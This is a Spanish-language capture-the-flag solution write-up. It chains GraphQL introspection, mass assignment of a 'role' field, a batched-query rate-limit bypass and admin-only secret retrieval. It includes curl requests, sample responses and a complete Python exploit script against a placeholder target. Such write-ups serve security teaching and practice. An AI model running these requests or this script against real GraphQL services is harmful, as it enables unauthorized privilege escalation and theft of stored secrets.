# Solution: web-graphql-chain

## Vulnerability Chain

1. **Introspection habilitada** - El gateway tiene introspection activa, revelando el schema completo
   incluyendo el campo `role` en `UserInput` (mass assignment vector).
2. **Mass Assignment en updateUser** - El campo `role` en `UserInput` permite que cualquier usuario
   cambie su propio rol a `admin` sin validacion de privilegios.
3. **Rate limit bypass con batch queries** - El rate limiting (5 req/min) cuenta batch arrays como
   una sola peticion, permitiendo enviar multiples mutaciones en una sola request.
4. **Flag en secrets subgraph** - La flag se encuentra como `Secret` accesible solo para admins.

## Paso 1: Introspection para descubrir el schema

```bash
curl -X POST http://TARGET:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name fields { name type { name } } } } }"
  }'
```

Buscar el tipo `UserInput` - revela el campo `role: String` (no deberia estar ahi).

## Paso 2: Registrar un usuario

```bash
curl -X POST http://TARGET:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { register(username: \"attacker\", email: \"a@b.com\", password: \"pass123\") { token user { id role } } }"
  }'
```

Respuesta: `{"token": "token-4-xxxx", "user": {"id": "4", "role": "user"}}`

## Paso 3: Mass Assignment - Escalar privilegios

Usar el token y cambiar el propio rol a `admin`:

```bash
# Con token obtenido en paso 2:
curl -X POST http://TARGET:8080/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token-4-xxxx" \
  -d '{
    "query": "mutation { updateUser(id: \"4\", input: { role: \"admin\" }) { id username role internalToken } }"
  }'
```

Respuesta: `{"id": "4", "username": "attacker", "role": "admin", "internalToken": "admin-token-4-xxxx"}`

Si se llega al rate limit, usar batch query para saltarlo:

```bash
curl -X POST http://TARGET:8080/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token-4-xxxx" \
  -d '[
    {"query": "mutation { updateUser(id: \"4\", input: { role: \"admin\" }) { id role internalToken } }"},
    {"query": "mutation { updateUser(id: \"4\", input: { role: \"admin\" }) { id role internalToken } }"},
    {"query": "mutation { updateUser(id: \"4\", input: { role: \"admin\" }) { id role internalToken } }"}
  ]'
```

El batch array cuenta como UNA peticion para el rate limiter.

## Paso 4: Obtener la flag

Con el token de admin (el `internalToken` retornado en paso 3):

```bash
curl -X POST http://TARGET:8080/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer admin-token-4-xxxx" \
  -d '{
    "query": "{ secrets { id name value } }"
  }'
```

Respuesta:
```json
{
  "data": {
    "secrets": [
      {"id": "1", "name": "db_password", "value": "P@ssw0rd!DB2024"},
      {"id": "2", "name": "api_key_stripe", "value": "sk_live_..."},
      {"id": "3", "name": "ctf_flag", "value": "HL4{...}"},
      {"id": "4", "name": "jwt_secret", "value": "..."}
    ]
  }
}
```

## Script completo (Python)

```python
import requests

TARGET = "http://TARGET:8080"

def gql(query, token=None, batch=False):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    payload = [{"query": query}] if batch else {"query": query}
    r = requests.post(f"{TARGET}/graphql", json=payload, headers=headers)
    return r.json()

# 1. Register
r = gql('mutation { register(username: "pwn", email: "p@w.n", password: "pwn123") { token user { id } } }')
token = r["data"]["register"]["token"]
user_id = r["data"]["register"]["user"]["id"]
print(f"[+] Registered: id={user_id}, token={token}")

# 2. Escalate (batch to bypass rate limit)
r = gql(
    f'mutation {{ updateUser(id: "{user_id}", input: {{ role: "admin" }}) {{ id role internalToken }} }}',
    token=token, batch=True
)
admin_token = r[0]["data"]["updateUser"]["internalToken"]
print(f"[+] Admin token: {admin_token}")

# 3. Get secrets
r = gql("{ secrets { name value } }", token=admin_token)
for s in r["data"]["secrets"]:
    if "flag" in s["name"].lower() or "HL4{" in s["value"]:
        print(f"[FLAG] {s['value']}")
```

## Por que funciona

- `UserInput` incluye el campo `role` (no deberia estar expuesto en la API publica).
- `updateUser` no verifica que el caller tenga permisos para cambiar el rol — solo aplica todos los
  campos del input directamente al usuario.
- El rate limiter evalua arrays como una sola peticion (`isinstance(body, list)`).
- El secrets-subgraph valida el token buscando `"admin"` en el string del token —
  el token generado para admins por escalacion contiene `"admin-token-"`.
